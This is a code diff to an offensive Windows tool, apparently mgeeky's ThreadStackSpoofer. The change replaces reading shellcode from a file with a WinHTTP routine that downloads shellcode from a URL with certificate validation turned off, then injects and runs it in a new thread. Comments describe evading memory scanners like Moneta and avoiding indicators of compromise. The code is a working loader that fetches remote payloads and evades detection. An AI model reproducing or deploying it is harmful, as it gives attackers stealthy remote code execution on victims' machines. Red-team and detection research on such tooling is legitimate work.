@@ -9,12 +9,12 @@ void WINAPI MySleep(DWORD dwMilliseconds)
 {
     //
     // Locate this stack frame's return address.
-    // 
+    //
     auto overwrite = (PULONG_PTR)_AddressOfReturnAddress();
     const auto origReturnAddress = *overwrite;
 
-    log("[>] Original return address: 0x", 
-        std::hex, std::setw(8), std::setfill('0'), origReturnAddress, 
+    log("[>] Original return address: 0x",
+        std::hex, std::setw(8), std::setfill('0'), origReturnAddress,
         ". Finishing call stack...");
 
     //
@@ -140,28 +140,83 @@ bool hookSleep()
     return true;
 }
 
-bool readShellcode(const char* path, std::vector<uint8_t>& shellcode)
+bool downloadShellcode(const char* url, std::vector<uint8_t>& shellcode)
 {
-    HandlePtr file(CreateFileA(
-        path,
-        GENERIC_READ,
-        FILE_SHARE_READ,
-        NULL,
-        OPEN_EXISTING,
-        0,
-        NULL
-    ), &::CloseHandle);
+    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
+    bool success = false;
 
-    if (INVALID_HANDLE_VALUE == file.get())
-        return false;
+    do {
+        hSession = WinHttpOpen(L"ThreadStackSpoofer/1.0",
+                              WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+                              WINHTTP_NO_PROXY_NAME,
+                              WINHTTP_NO_PROXY_BYPASS,
+                              0);
+        if (!hSession) break;
 
-    DWORD highSize;
-    DWORD readBytes = 0;
-    DWORD lowSize = GetFileSize(file.get(), &highSize);
+        WCHAR wUrl[2048] = { 0 };
+        MultiByteToWideChar(CP_ACP, 0, url, -1, wUrl, 2048);
 
-    shellcode.resize(lowSize, 0);
+        URL_COMPONENTS urlComponents = { 0 };
+        WCHAR hostname[256] = { 0 };
+        WCHAR urlPath[1024] = { 0 };
 
-    return ReadFile(file.get(), shellcode.data(), lowSize, &readBytes, NULL);
+        urlComponents.dwStructSize = sizeof(urlComponents);
+        urlComponents.lpszHostName = hostname;
+        urlComponents.dwHostNameLength = sizeof(hostname) / sizeof(WCHAR) - 1;
+        urlComponents.lpszUrlPath = urlPath;
+        urlComponents.dwUrlPathLength = sizeof(urlPath) / sizeof(WCHAR) - 1;
+
+        if (!WinHttpCrackUrl(wUrl, 0, 0, &urlComponents)) break;
+
+        hConnect = WinHttpConnect(hSession, hostname, urlComponents.nPort, 0);
+        if (!hConnect) break;
+
+        DWORD flags = (urlComponents.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0;
+        hRequest = WinHttpOpenRequest(hConnect, L"GET", urlPath, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
+        if (!hRequest) break;
+
+        if (urlComponents.nScheme == INTERNET_SCHEME_HTTPS) {
+            DWORD securityFlags = SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
+                                 SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
+                                 SECURITY_FLAG_IGNORE_UNKNOWN_CA |
+                                 SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
+
+            WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &securityFlags, sizeof(securityFlags));
+        }
+
+        if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) break;
+        if (!WinHttpReceiveResponse(hRequest, NULL)) break;
+
+        DWORD statusCode = 0;
+        DWORD statusCodeSize = sizeof(statusCode);
+        WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, NULL, &statusCode, &statusCodeSize, NULL);
+
+        if (statusCode != 200) break;
+
+        std::vector<uint8_t> buffer;
+        DWORD bytesRead = 0;
+        DWORD bytesAvailable = 0;
+
+        do {
+            if (!WinHttpQueryDataAvailable(hRequest, &bytesAvailable)) break;
+            if (bytesAvailable == 0) break;
+
+            std::vector<uint8_t> tempBuffer(bytesAvailable);
+            if (!WinHttpReadData(hRequest, tempBuffer.data(), bytesAvailable, &bytesRead)) break;
+
+            buffer.insert(buffer.end(), tempBuffer.begin(), tempBuffer.begin() + bytesRead);
+        } while (bytesAvailable > 0);
+
+        shellcode = std::move(buffer);
+        success = true;
+
+    } while (false);
+
+    if (hRequest) WinHttpCloseHandle(hRequest);
+    if (hConnect) WinHttpCloseHandle(hConnect);
+    if (hSession) WinHttpCloseHandle(hSession);
+
+    return success;
 }
 
 void runShellcode(LPVOID param)
@@ -170,7 +225,7 @@ void runShellcode(LPVOID param)
 
     //
     // Jumping to shellcode. Look at the coment in injectShellcode() describing why we opted to jump
-    // into shellcode in a classical manner instead of fancy hooking 
+    // into shellcode in a classical manner instead of fancy hooking
     // ntdll!RtlUserThreadStart+0x21 like in ThreadStackSpoofer example.
     //
     func();
@@ -197,7 +252,7 @@ bool injectShellcode(std::vector<uint8_t>& shellcode, HandlePtr& thread)
 
     //
     // Then we change that protection to RX
-    // 
+    //
     if (!VirtualProtect(alloc, shellcode.size() + 1, Shellcode_Memory_Protection, &old))
         return false;
 
@@ -207,20 +262,20 @@ bool injectShellcode(std::vector<uint8_t>& shellcode, HandlePtr& thread)
     // Example provided in previous release of ThreadStackSpoofer:
     //      https://github.com/mgeeky/ThreadStackSpoofer/blob/ec0237c5f8b1acd052d57562a43f40a20752b5ca/ThreadStackSpoofer/main.cpp#L417
     // showed how we can start our shellcode from temporarily hooked ntdll!RtlUserThreadStart+0x21 .
-    // 
+    //
     // That approached was a bit flawed due to the fact, the as soon as we introduce a hook within module,
     // even when we immediately unhook it the system allocates a page of memory (4096 bytes) of type MEM_PRIVATE
-    // inside of a shared library allocation that comprises of MEM_IMAGE/MEM_MAPPED pool. 
-    // 
+    // inside of a shared library allocation that comprises of MEM_IMAGE/MEM_MAPPED pool.
+    //
     // Memory scanners such as Moneta are sensitive to scanning memory mapped PE DLLs and finding amount of memory
     // labeled as MEM_PRIVATE within their region, considering this (correctly!) as a "Modified Code" anomaly.
-    // 
+    //
     // We're unable to evade this detection for kernel32!Sleep however we can when it comes to ntdll. Instead of
     // running our shellcode from a legitimate user thread callback, we can simply run a thread pointing to our
     // method and we'll instead jump to the shellcode from that method.
-    // 
+    //
     // After discussion I had with @waldoirc we came to the conclusion that in order not to bring new IOCs it is better
-    // to start shellcode from within EXE's own code space, thus avoiding detections based on `ntdll!RtlUserThreadStart+0x21` 
+    // to start shellcode from within EXE's own code space, thus avoiding detections based on `ntdll!RtlUserThreadStart+0x21`
     // being an outstanding anomaly in some environments. Shout out to @waldoirc for our really long discussion!
     //
     thread.reset(::CreateThread(
@@ -239,17 +294,17 @@ int main(int argc, char** argv)
 {
     if (argc < 3)
     {
-        log("Usage: ThreadStackSpoofer.exe <shellcode> <spoof>");
+        log("Usage: ThreadStackSpoofer.exe <shellcode_url> <spoof>");
         return 1;
     }
 
     std::vector<uint8_t> shellcode;
     bool spoof = (!strcmp(argv[2], "true") || !strcmp(argv[2], "1"));
 
-    log("[.] Reading shellcode bytes...");
-    if (!readShellcode(argv[1], shellcode))
+    log("[.] Downloading shellcode from URL...");
+    if (!downloadShellcode(argv[1], shellcode))
     {
-        log("[!] Could not open shellcode file! Error: ", ::GetLastError());
+        log("[!] Could not download shellcode from URL! Error: ", ::GetLastError());
         return 1;
     }
 
